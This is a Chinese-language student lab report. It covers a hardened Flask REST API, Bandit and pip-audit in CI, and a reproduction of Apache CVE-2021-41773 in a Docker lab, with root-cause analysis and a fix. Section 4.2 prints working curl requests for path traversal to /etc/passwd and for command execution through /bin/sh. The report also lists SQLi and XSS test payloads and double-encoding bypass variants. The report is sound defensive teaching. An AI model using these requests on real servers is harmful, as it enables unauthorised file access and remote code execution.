# 实验一 报告：安全 REST API 开发、CI/CD 与真实 CVE 漏洞分析

> **实验编号**：Work 1（实验 1）
> **实验题目**：Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis
> **变体号**：`<填写你的变体号>`
> **姓名**：`<姓 名>`
> **HDU 号（学号）**：`<填写学号>`
> **日期**：2026-10-19
> **仓库地址**：`https://github.com/<OWNER>/<REPO>`
> **CI 流水线地址**：`https://github.com/<OWNER>/<REPO>/actions`

---

## 1. 实验目的

1. 按 OWASP Top 10 的要求，从零构建一个具备基本安全防护的后端 REST API。
2. 把 SAST（静态应用安全测试）与 SCA（软件成分分析）接入 CI/CD，让每次 push / PR 自动做安全体检。
3. 在受控环境中启动真实的漏洞环境（Vulhub），复现一个真实的 CVE，完成“复现 → 根因 → 修复 → 验证”的完整闭环。
4. 学会用工程化的方式表达安全结论：可复现的命令、可对比的截图、可验证的修复。

---

## 2. 实验环境

| 项目 | 版本 / 说明 |
|---|---|
| 操作系统 | Windows 11 (26100)，实验另在 Ubuntu-latest runner 上跑 CI |
| Python | 3.12.4 |
| 框架 | Flask 3.1.2 |
| 数据库 | SQLite 3（WAL 模式） |
| 认证 | PyJWT 2.10.1（HS256）+ bcrypt 4.3.0（cost 12） |
| 测试 | pytest 8.4.2，63 个用例 |
| SAST | Bandit 1.7.9+ |
| SCA | pip-audit 2.7.3+ |
| 容器 | Docker Desktop + Docker Compose v2 |
| 漏洞靶场 | Vulhub `httpd/CVE-2021-41773` |

---

## 3. 第一部分：安全 REST API 的实现

### 3.1 技术选型与项目初始化

选择 **Python + Flask + SQLite**：依赖少、代码量小，评审者能在几分钟内读完；
`bandit` 与 `pip-audit` 对 Python 生态支持最成熟；SQLite 免部署，便于把注意力放在
安全实现而不是基础设施上。

```bash
python -m venv .venv && .venv\Scripts\activate
pip install -r requirements-dev.txt
git init && git add . && git commit -m "feat: secure Flask API skeleton"
git remote add origin https://github.com/<OWNER>/<REPO>.git
git push -u origin main
```

项目结构（关键文件）：

```
app/
├── __init__.py     应用工厂、安全响应头
├── config.py       环境变量配置；production 缺 SECRET_KEY 直接拒绝启动
├── db.py           建表 + 全部参数化查询
├── security.py     bcrypt / JWT / 输入校验 / 输出转义 / 登录限速
├── errors.py       统一 JSON 错误，不泄露堆栈
├── auth.py         POST /auth/login
└── api.py          GET /api/data、POST /api/posts、GET /api/me
tests/              63 个用例（含 SQLi / XSS 回归）
cve/                漏洞环境、利用脚本、补丁、验证脚本
.github/workflows/ci.yml
```

### 3.2 API 设计

| # | 方法 | 路径 | 是否需要认证 | 说明 |
|---|---|---|---|---|
| 1 | POST | `/auth/login` | 否 | 接收 `login` / `password`，返回 JWT |
| 2 | GET | `/api/data` | 是 | 返回帖子列表，支持 `limit` / `offset` / `q` |
| 3 | POST | `/api/posts` | 是 | **自选接口**：创建帖子，演示写路径的校验与转义 |
| + | GET | `/api/me` | 是 | 返回令牌中携带的身份信息 |
| + | GET | `/health` | 否 | 存活探针 |

调用示例（`scripts/demo.ps1` 会依次跑完这些请求）：

```bash
curl -s -X POST http://127.0.0.1:5000/auth/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"alice","password":"Passw0rd!Alice"}'
```

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 900,
  "user": {"id": 1, "username": "alice", "role": "admin"}
}
```

无令牌访问受保护接口：

```bash
curl -i http://127.0.0.1:5000/api/data
```

```http
HTTP/1.1 401 UNAUTHORIZED
WWW-Authenticate: Bearer error="missing_token"

{"error": {"code": "unauthorized", "message": "Missing or malformed Authorization header (expected 'Bearer <token>')."}}
```

**实测记录**（`scripts/demo.ps1` 输出，全部 PASS）：

| 步骤 | 请求 | 结果 |
|---|---|---|
| 1 | `GET /health` | 200 |
| 2 | `POST /auth/login`（alice） | 200，返回 900 秒有效的 JWT |
| 3 | `GET /api/data`（无令牌） | **401** |
| 4 | `GET /api/data`（伪造令牌） | **401** |
| 5 | `GET /api/data`（正确令牌） | 200，`total=2` |
| 6 | `POST /api/posts` | 201 |
| 7 | 登录框注入 `alice' OR '1'='1` | **401** |
| 8 | 搜索参数注入 `' OR 1=1 --` | 200，`total=0`（被当作字面量） |
| 9 | 存储型 XSS `<script>alert('XSS')</script>` | 201，响应中为 `&lt;script&gt;...` |

### 3.3 安全措施实现

#### 3.3.1 SQL 注入防护：全参数化

`app/db.py` 是唯一与 SQLite 交互的模块，所有语句都用 `?` 占位符绑定：

```python
row = get_db().execute(
    "SELECT id, username, password_hash, role FROM users WHERE username = ?",
    (username,),          # 用户名是数据，不是 SQL
).fetchone()
```

模糊搜索同样绑定参数，因此 `' OR 1=1 --` 只会被当成普通子串匹配：

```python
"WHERE p.title LIKE ? OR p.body LIKE ?", (f"%{search}%", f"%{search}%")
```

> 关键点：拼接发生在**参数值**里，不在 SQL 语法里。占位符由驱动负责转义，
> 攻击者即使输入引号也无法改变语句结构。

#### 3.3.2 XSS 防护：输出编码 + 输入约束

存储时保留原文（便于编辑），**离开 API 时统一 HTML 转义**
（`app/security.py::escape_value`，递归处理 dict / list）：

```python
"<script>alert('XSS')</script>"
  ->  "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"
```

配合三道防线：

1. 响应头 `Content-Type: application/json` + `X-Content-Type-Options: nosniff`，
   浏览器不会把 JSON 当 HTML 解析；
2. `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`；
3. 输入校验拒绝控制字符（`\x00`、`\x1b` 等）并限制长度，顺便挡住日志注入 / 响应头注入。

#### 3.3.3 认证与会话

| 要求 | 实现 |
|---|---|
| 口令绝不明文 | bcrypt，cost=12，每条口令独立随机盐 |
| 规避 bcrypt 72 字节截断 | 超长口令在建哈希前直接拒绝 |
| 登录签发令牌 | HS256 JWT，含 `sub/iss/aud/iat/nbf/exp/jti`，有效期 15 分钟 |
| 所有受保护端点校验 | `@jwt_required` 装饰器 |
| 算法固定 | `algorithms=["HS256"]`，杜绝 `alg:none` 与 RS→HS 混淆 |
| 声明校验 | `iss`、`aud`、必需声明、过期时间（5 秒容差） |
| 令牌吊销 | 每次请求回表查用户，账号被删则令牌立即失效 |
| 防用户枚举 | “用户不存在”与“口令错误”返回完全一致的状态码与正文；并执行一次假 bcrypt 校验以拉平耗时 |
| 防暴力破解 | 同一 (IP, 用户名) 5 分钟内 5 次失败 → `429` + `Retry-After` |

关键代码：

```python
@wraps(view)
def wrapper(*args, **kwargs):
    claims = decode_access_token(bearer_token_from_request())   # 验签 + 校验声明
    user = find_user_by_id(int(claims["sub"]))
    if user is None:
        raise AuthError("Account no longer exists.")
    g.current_user = user
    return view(*args, **kwargs)
```

#### 3.3.4 其他加固

统一 JSON 错误体（不含堆栈 / SQL / 路径）、`MAX_CONTENT_LENGTH=64KiB`、
`Cache-Control: no-store`、`X-Frame-Options: DENY`、开发服务器只监听 `127.0.0.1`、
production 模式缺少 `SECRET_KEY` 直接拒绝启动。

### 3.4 测试

```bash
pytest --cov=app --cov-report=term-missing
```

```
tests/test_auth.py        19 passed
tests/test_api.py         20 passed
tests/test_sqli_xss.py    24 passed
======================== 63 passed ========================
```

安全回归用例（部分）：

| 用例 | 断言 |
|---|---|
| `test_sqli_in_login_never_authenticates[7 payloads]` | 401，且响应中不含 `access_token` |
| `test_sqli_in_search_is_treated_as_literal_text` | `total=0`，表结构完好 |
| `test_sqli_error_messages_are_not_leaked` | 响应体不含 `sqlite` / `syntax error` / `select ` |
| `test_stored_xss_is_escaped_on_output` | 原始 `<script>` 不出现，`&lt;script&gt;` 出现 |
| `test_reflected_xss_is_escaped[5 payloads]` | `<script` / `<img` / `<svg` / `<iframe` 均不出现 |
| `test_alg_none_token_is_rejected` | 401 |
| `test_token_signed_with_attacker_key_is_rejected` | 401 |
| `test_login_is_rate_limited` | 第 6 次返回 429 + `Retry-After` |

### 3.5 CI/CD 与 SAST/SCA

`.github/workflows/ci.yml` 在每次 push 与 PR 时运行三个 job：

| Job | 工具 | 作用 |
|---|---|---|
| `test` | pytest（3.11 / 3.12 矩阵 + 覆盖率） | 功能与安全回归 |
| `sast-bandit` | `bandit -r app -ll -ii`，并输出 SARIF 上传代码扫描 | 静态发现中高危问题 |
| `sca-pip-audit` | `pip-audit -r requirements.txt --strict` | 依赖已知漏洞 |

两个扫描器都会把原始报告写进 GitHub 的 **Job Summary**，因此截图里能直接看到
工具输出，而不是只有一个绿色对勾。

**截图位置**：

| 内容 | 位置 |
|---|---|
| 绿色流水线 | Actions → CI → 最近一次运行 |
| Bandit 报告 | Actions → CI → *SAST - Bandit* → Summary |
| pip-audit 报告 | Actions → CI → *SCA - pip-audit* → Summary |
| 代码扫描结果 | Security → Code scanning |

> ⬜ **待补截图**：`docs/screenshots/ci-green.png`、`bandit.png`、`pip-audit.png`
> （push 到自己的仓库后按上表位置截图）

---

## 4. 第二部分：CVE-2021-41773 的复现与分析

### 4.1 选择与准备

选择 **CVE-2021-41773（Apache HTTP Server 2.4.49 路径穿越）**，理由：

* 根因集中在**一个函数**（`ap_normalize_path()`），可以精确到代码行级分析；
* 一条 `curl` 即可复现，前后对比毫无歧义；
* 修复是**版本升级**，可验证性强，且两次实验配置完全一致，只变一个变量；
* 它串起了三个经典问题：规范化顺序错误 + 过宽的文件系统授权 + 开启 CGI，
  适合讨论纵深防御。

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/httpd/CVE-2021-41773
docker compose up -d
```

或直接使用本仓库自带的等价环境（`cve/Dockerfile` 与 Vulhub 的配置逐行一致）：

```bash
cd cve
docker compose up -d --build
```

服务起在 `http://127.0.0.1:8080`，首页返回 `It works!`。

### 4.2 攻击复现

```bash
# 0) 确认 /icons/ 别名目录存在（由 httpd-autoindex.conf 提供）
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8080/icons/

# 1) 路径穿越读取 /etc/passwd
#    %2e 是 URL 编码的 '.'；--path-as-is 阻止 curl 在客户端替我们展开 ..
curl --path-as-is \
  'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

# 2) 因为启用 mod_cgi，同一手法可以走到 /bin/sh，形成命令执行
curl --path-as-is --data 'echo;id' \
  'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

预期输出（漏洞环境）：

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

> `--path-as-is` 是关键：不加它，curl 会先把 `/icons/.%2e/../` 归一化掉，
> 请求根本不会离开文档根目录。

> ⬜ **待补截图**：`docs/screenshots/cve-exploit.png`
> （漏洞环境中 `curl` 返回 `/etc/passwd` 内容 + `id` 命令执行结果）

### 4.3 根因分析

**缺陷位置**：`server/request.c` 中的 `ap_normalize_path()`——2.4.49 重写的新规范化函数。

**缺陷本质**：函数在一次扫描里同时做两件事——

1. **解码**百分号编码（`%2e` → `.`）；
2. **判断**当前段是否为应当折叠的 `.` / `..`。

这两步的顺序反了：判断“是不是点段”时，字符**还是编码态**。于是

```
.%2e      # 不等于 ".."，因此不会被识别为穿越段
```

安然通过规范化，随后才被解码成真正的 `..`。交给核心映射函数的路径里，
仍然存在一个生效的 `..`。

接着 `ap_core_translate()` 按 `Alias /icons/ ...` 把它映射到文件系统，
却没有再校验结果是否仍在别名目录内。`..` 于是尽职地向上走了一层又一层。

所以这不是“忘了做输入校验”，而是**校验器与解码器对同一个字符串的理解不一致**
（规范化 / 解码顺序错误，典型的 canonicalisation 漏洞）。这正是 CWE-22 的形状：
检查时解析出的名字，与最终打开的名字不是同一个。

**放大因素**（把“读文件”升级为“拿服务器”）：

| 配置 | 后果 |
|---|---|
| `<Directory /> Require all granted` | 逃逸后的路径被**授权**，`/etc/passwd`、应用密钥、云元数据（169.254.169.254）都可读 |
| `LoadModule cgi_module` | 穿越可以落到 `/cgi-bin/` 下的 `/bin/sh`，以 `daemon` 身份执行任意命令 |

同一个代码缺陷，在一种部署里是 7.5（信息泄露），在另一种部署里是 9.8（RCE）：
**影响取决于配置，缺陷本身不取决。**

**为什么第一次补丁不够**：2.4.50 加了“拒绝字面量 `%2e`”的过滤。过滤作用在编码态上，
于是双重编码直接绕过——`%%32%65` 解一次是 `%2e`，再解一次就是 `.`。这就是
CVE-2021-42013（CVSS 9.8）。2.4.51 放弃黑名单，改成：先完整解码 → 在解码后的字符串上
折叠点段 → 任何会爬到根之上的路径直接拒绝。

> 结论：**对编码后的输入做黑名单是必输的游戏；先规范化，再校验，最后才使用。**

### 4.4 修复

`cve/Dockerfile.fixed` 只改一行：

```diff
-FROM vulhub/httpd:2.4.49
+FROM httpd:2.4.51
```

其余配置（CGI 开启、`Require all granted`、autoindex）**完全保持不变**，
从而把变量隔离为“规范化代码是否打了补丁”。如果攻击失效，只能归因于代码修复，
而不是某个配置被顺手关掉了。

```bash
docker compose down
docker compose -f docker-compose.fixed.yml up -d --build
```

### 4.5 修复验证（含回归）

```bash
powershell -ExecutionPolicy Bypass -File .\cve\verify-fix.ps1
```

脚本不仅重放原始 payload，还重放**整个绕过家族**（双重编码、`%2f`、`/.%2e/`），
并做回归检查：

```
[PASS] home page still returns 200                     <- 功能未受损
[PASS] traversal answered with 404/403
[PASS] no /etc/passwd content in the body
[PASS] no uid= in the response
[PASS] no leak for /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hostname
[PASS] no leak for /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
[PASS] no leak for /.%2e/.%2e/.%2e/.%2e/etc/passwd
[PASS] no leak for /icons/..%2f..%2f..%2f..%2fetc%2fpasswd
RESULT: fix verified -- all checks passed.
```

只修公告里那一个字符串等于做黑名单，2.4.50 的教训就在眼前；因此验证必须覆盖变体。

> ⬜ **待补截图**：`docs/screenshots/cve-fixed.png`
> （修复后同一命令返回 404，以及 `verify-fix` 的 PASS 汇总）

### 4.6 纵深防御建议

版本升级是**真正的修复**；以下是缩小爆炸半径的加固，不能替代升级：

```apache
<Directory />
    AllowOverride none
    Require all denied      # 不把整个文件系统交给服务器
</Directory>
```

```yaml
# docker-compose 层
    read_only: true
    user: "1000:1000"
    security_opt: ["no-new-privileges:true"]
    cap_drop: ["ALL"]
```

以及：只在必要目录启用 CGI、限制容器出网（阻断元数据 SSRF）、
把 WAF 规则当作止血带而不是解药、订阅 CISA KEV 及时打补丁。

---

## 5. 结论

1. 一个“能用”的 API 与一个“安全”的 API 差别不在功能，而在**每个信任边界上的一次决策**：
   参数绑定、输出编码、令牌验签、错误信息收敛。
2. 安全测试必须可回归：63 个用例里有 24 个专门用来打自己，改坏了 CI 立刻变红。
3. CVE 复现的价值在于**建立因果链**：一行 `%2e` → 一个函数的顺序错误 → 一次 404 与一次
   `root:x:0:0`。看懂这条链，才谈得上写出补丁和写出检测规则。
4. 修复要以“同一配置、只变版本”的方式验证，并同时做回归测试；否则你无法区分
   “修好了”和“被我关掉了”。

### 得分点对照

| 评分项 | 分值 | 本作品对应位置 |
|---|---|---|
| API 功能 | 2 | 3.2（3 个主接口 + 2 个辅助接口），demo 全部 PASS |
| 防 SQLi | 0.5 | 3.3.1 + 7 个注入用例 |
| 防 XSS | 0.5 | 3.3.2 + 5 个 payload 用例 |
| 认证（JWT + 哈希） | 1 | 3.3.3 + 认证用例 19 个 |
| CI/CD（SAST/SCA） | 2 | 3.5，Bandit + pip-audit + 报告截图 |
| 漏洞环境与 CVE 复现 | 2 | 4.1–4.2 |
| 根因分析深度 | 1 | 4.3 |
| 修复正确性与验证 | 1 | 4.4–4.5 |

---

## 6. 控制问题

**1. 为什么用 bcrypt 这类算法做口令哈希，比 SHA-256 更好？**

SHA-256 的设计目标是“快”，现代 GPU 每秒能算上百亿次，泄露的哈希表很快被字典/暴力
攻破。bcrypt 的设计目标是“故意慢”：cost 因子可调（cost=12 即 4096 轮），每条口令
独立随机盐（彩虹表失效），并且基于 Blowfish 密钥调度，需要较多内存与计算。
更重要的是 cost 可以随硬件进步而上调，而 SHA-256 没有这个旋钮。

**2. SAST 与 DAST 的主要区别是什么？**

SAST 是白盒：不运行程序，直接分析源码 / 字节码的数据流，能在提交阶段就发现
注入、硬编码密钥等问题，定位到行，但误报多、看不到运行时配置与第三方组件。
DAST 是黑盒：像攻击者一样对运行中的系统发 HTTP 请求，能发现真实的运行时问题
（认证绕过、跨层注入），但无法指出代码位置，也覆盖不到未被路由触达的代码。
本实验用 SAST（Bandit + pip-audit）守代码与依赖，DAST 留到实验二用 ZAP 做。

**3. 描述 JWT 的工作机制：它包含什么信息，服务端如何验证真伪？**

JWT 由三段 base64url 组成：`header.payload.signature`。payload 是声明集合
（`sub` 主体、`exp` 过期、`iat` 签发时间、`iss` 签发者、`aud` 受众、自定义角色等）。
**payload 只是编码不是加密**，任何拿到令牌的人都能读，所以绝不能放敏感数据。
服务端用密钥对 `header.payload` 重新计算签名并与第三段比对（HS256 是 HMAC-SHA256；
RS256 则用私钥签、公钥验），同时校验 `iss`/`aud`/`exp`/`nbf` 与必需声明是否存在。
签名保证不可伪造，`exp` 限制被盗令牌的可用窗口；服务端还应固定算法白名单，
否则会出现 `alg:none` 或 RS→HS 混淆攻击。

**4. 不审计第三方依赖会带来什么风险？**

现代应用 80% 以上的代码来自依赖，攻击者不需要碰你的代码，只要你的一个传递依赖
有已知漏洞（Log4Shell、Struts2、本次的 httpd）就能进入。而且漏洞披露到利用往往只有
几天，你没有时间临时评估。SCA 的价值是：生成可见的 SBOM、在 CI 里对已知 CVE 报警、
把“该不该升级”变成流程而不是个人记忆。

**5. 用 Docker + Vulhub 学习安全，比在本机直接装有漏洞的软件好在哪？**

隔离与可丢弃：打穿了也只是容器，快照 / 重建即可复原；版本精确可复现，
不会因为“我这台机器是 2.4.51”而复现失败；漏洞版与修复版可以并排对比，
只改一个 tag；配置被固化成代码，评审者可复核；对教学而言，所有人的环境一致，
评分可复现。

**6. 漏洞与利用（exploit）的区别？本实验复现的是哪一个？**

漏洞是**缺陷本身**（例如 `ap_normalize_path()` 中解码与点段判断的顺序错误）；
利用是**把缺陷变成效果的具体手段**（`curl --path-as-is '.../.%2e/%2e%2e/...'` 这条请求）。
本实验是在人为搭建的漏洞环境中，**用公开的 exploit 复现漏洞**：我证明的是漏洞可被利用，
并据此分析根因、打补丁、再证明利用失效。

**7. 打了补丁之后，为什么还必须做回归测试？**

因为修复往往改动的是公共路径（这里是 URI 规范化），很容易顺带弄坏正常请求：
2.4.50 的修复本身就是“修好了穿越、却引入新的绕过”的反面教材。
回归测试回答两个问题：修复是否**精准**（只挡住恶意，不影响正常），
以及是否**引入新问题**（可用性、性能、兼容性）。没有回归的“修复”可能只是把功能关掉了。

**8. 掌握并复现已知 CVE，对安全从业者（渗透测试 / SOC 分析）有什么用？**

对渗透测试：CVE 复现是“证明影响”的标准动作，也是资产排查的最快路径——
先按 KEV 清单扫一遍已知被在野利用的漏洞，再谈深度测试。
对 SOC 分析：知道请求长什么样（`/.%2e/`、双重编码、异常的 `--path-as-is` 目标），
才能写出检测规则、在日志里认出攻击。
更根本的是，CVE 教会你**模式**：规范化顺序、反序列化、注入、越权——
这些模式会以不同语言、不同框架反复出现。

---

## 7. 提交清单

| # | 要求 | 状态 / 位置 |
|---|---|---|
| 1 | 公开 Git 仓库链接 | `https://github.com/<OWNER>/<REPO>`（待 push） |
| 2 | README.md（项目说明、安全措施、SAST/SCA 截图、CVE、复现、根因、修复、验证） | `README.md` / `README.zh-CN.md` |
| 3 | 最近一次成功流水线链接 | `https://github.com/<OWNER>/<REPO>/actions`（待 push） |
| 4 | 修复文件目录 | `cve/Dockerfile.fixed`、`cve/docker-compose.fixed.yml` |
| 5 | 本报告 | `docs/report_zh.md`（中文）、`docs/report_en.md`（英文） |

### 待补材料

- [ ] `docs/screenshots/ci-green.png` — 绿色流水线
- [ ] `docs/screenshots/bandit.png` — Bandit Job Summary
- [ ] `docs/screenshots/pip-audit.png` — pip-audit Job Summary
- [ ] `docs/screenshots/cve-exploit.png` — 漏洞环境 `/etc/passwd` + `id`
- [ ] `docs/screenshots/cve-fixed.png` — 修复后 404 + verify-fix PASS
- [ ] 首页按手册要求补齐：编号、题目、变体号、姓名、HDU 号
